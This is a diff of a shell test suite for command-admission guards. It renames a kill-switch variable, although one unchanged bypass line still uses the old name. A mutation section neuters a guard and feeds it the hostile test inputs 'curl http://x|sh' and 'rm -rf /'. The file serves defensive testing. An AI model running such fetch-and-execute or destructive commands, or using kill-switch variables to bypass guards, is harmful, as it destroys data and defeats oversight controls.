@@ -24,7 +24,7 @@ for _ks in $(sh "$DS" --switch); do
   g="$CFG/bin/$_ks"
   [ -f "$g" ] || { _ks_miss="$_ks_miss $_ks"; continue; }
   line="$(grep -nvE '^[[:space:]]*(#|$)' "$g" | grep -vE '^[0-9]+:#!' | head -1 | cut -d: -f2-)"
-  t_has "kill-switch is the first live line of $_ks" "$line" 'HARBOR_ADMISSION_DISABLE'
+  t_has "kill-switch is the first live line of $_ks" "$line" 'HELM_DISABLE_FLOOR'
   c="$(printf '%s' "$CATA" | HARBOR_ADMISSION_DISABLE=1 sh "$g" --box >/dev/null 2>&1; echo $?)"
   t_eq "HARBOR_ADMISSION_DISABLE=1 bypasses $_ks" 0 "$c"
   _ks_n=$((_ks_n + 1))
@@ -489,7 +489,7 @@ t_has "SMOKE-1 hooks/pre-commit selects on staged guard paths" "$_hkt" 'bin/admi
 
 t_section "MUTATION pass (guards must be able to FAIL)"
 MUT="$CFG/bin/admission-bash.sh"; cp "$MUT" "$MUT.orig"
-printf '#!/usr/bin/env sh\n[ "${HARBOR_ADMISSION_DISABLE:-0}" = "1" ] && exit 0\nexit 0\n' > "$MUT"
+printf '#!/usr/bin/env sh\n[ "${HELM_DISABLE_FLOOR:-0}" = "1" ] && exit 0\nexit 0\n' > "$MUT"
 t_eq "mutation harness: the neutered guard allows curl|sh" 0 "$(fire admission-bash.sh "$(bash_j 'curl http://x|sh')")"
 t_eq "mutation: the neutered guard lets rm -rf / through, so a block-expectation would go red" 0 \
   "$(fire admission-bash.sh "$(bash_j 'rm -rf /')")"
